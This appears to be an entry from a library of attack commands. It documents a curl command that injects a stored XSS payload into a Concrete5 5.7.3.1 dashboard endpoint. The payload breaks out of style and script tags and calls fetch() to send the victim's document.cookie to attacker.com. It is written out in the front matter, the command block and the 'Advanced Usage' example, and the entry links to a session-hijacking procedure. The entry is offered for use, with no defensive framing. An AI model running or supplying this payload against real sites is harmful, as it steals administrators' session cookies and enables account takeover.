---
id: cmd-curl-exfil-cookies-001
data: >-
  curl -X POST -d
  'pageURL="--></style></scRipt><scRipt>fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)</scRipt>'
  https://target.com/concrete5.7.3.1/index.php/dashboard/pages/single
tags:
  - xss
  - exfiltration
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:31.907Z'
verified: false
validated: true
submitted: true
---
# curl-exfil-cookies

## Command

```bash
curl -X POST -d 'pageURL="--></style></scRipt><scRipt>fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)</scRipt>' https://target.com/concrete5.7.3.1/index.php/dashboard/pages/single
```

## Description

Injects an XSS payload via POST to exfiltrate document cookies to an external server in Concrete5 single page endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | Payload with fetch for cookie theft | Yes |
| URL | Vulnerable dashboard endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'pageURL=test' https://target.com/concrete5.7.3.1/index.php/dashboard/pages/single
```

### Advanced Usage

```bash
curl -X POST -d 'pageURL="--></style></scRipt><scRipt>fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)</scRipt>' -v https://target.com/concrete5.7.3.1/index.php/dashboard/pages/single
```

## Expected Output

Response reflects payload; upon browser execution, GET request to attacker.com with cookies.

## Related

- [[commands/curl-inject-xss-bannedwords]]
- [[procedures/Execute-Payload-for-Session-Hijacking]]
